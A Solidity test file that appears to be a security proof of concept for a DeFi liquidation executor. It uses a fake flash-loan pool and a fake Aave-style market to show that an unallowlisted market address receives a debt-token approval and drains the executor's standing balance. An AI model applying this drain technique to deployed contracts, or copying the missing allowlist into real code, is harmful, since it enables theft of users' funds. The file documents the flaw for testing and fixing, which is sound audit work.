// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {ExecutorTestBase} from "../unit/Base.sol";
import {PlanBuilder as PB} from "../unit/PlanBuilder.sol";
import {MockERC20} from "../unit/Mocks.sol";

interface IUniV3FlashCb {
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external;
}

contract FakeUniV3Flash2 {
    function flash(address recipient, uint256, uint256, bytes calldata data) external {
        IUniV3FlashCb(recipient).uniswapV3FlashCallback(0, 0, data);
    }

    function token0() external pure returns (address) {
        return address(0);
    }
}

/// Aave-shaped market: reports liquidatable HF and pulls the approved debt.
contract FakeAaveMarket {
    function getUserAccountData(address)
        external
        pure
        returns (uint256, uint256, uint256, uint256, uint256, uint256)
    {
        return (0, 0, 0, 0, 0, 0.5e18); // hf < 1e18
    }

    function liquidationCall(address, address debt, address, uint256 debtToCover, bool) external {
        require(MockERC20(debt).transferFrom(msg.sender, address(this), debtToCover), "pull");
    }
}

/*
 * Plan `l.market` receives exact debt approve with no allowlist (DRAFT-07 / SA market class).
 * Fake flash + repaySwapCount=0 so the tx can complete after the siphon.
 */
contract FakeMarketApproveDrainPoC is ExecutorTestBase {
    FakeUniV3Flash2 internal fakeFlash;
    FakeAaveMarket internal fakeMarket;

    function setUp() public override {
        super.setUp();
        fakeFlash = new FakeUniV3Flash2();
        fakeMarket = new FakeAaveMarket();
    }

    function test_poc_fake_market_drains_standing_debt() public {
        // Steal REPAY via fake market; leave REPAY for fake flash "repay" transfer.
        debt.mint(address(ex), uint256(REPAY) * 2);

        bytes memory plan = bytes.concat(
            PB.header(0, 0, 0, 0, 1),
            PB.groupHead(PB.P_UNIV3, address(fakeFlash), address(debt), REPAY, 1, 0),
            PB.legV3(address(fakeMarket), borrower, address(coll), REPAY),
            PB.profit(0, "")
        );

        uint256 stolenBefore = debt.balanceOf(address(fakeMarket));
        _exec(plan);
        assertEq(
            debt.balanceOf(address(fakeMarket)) - stolenBefore,
            REPAY,
            "fake market pulled approved debt"
        );
        assertEq(debt.balanceOf(address(fakeFlash)), REPAY, "fake flash took repay");
    }
}
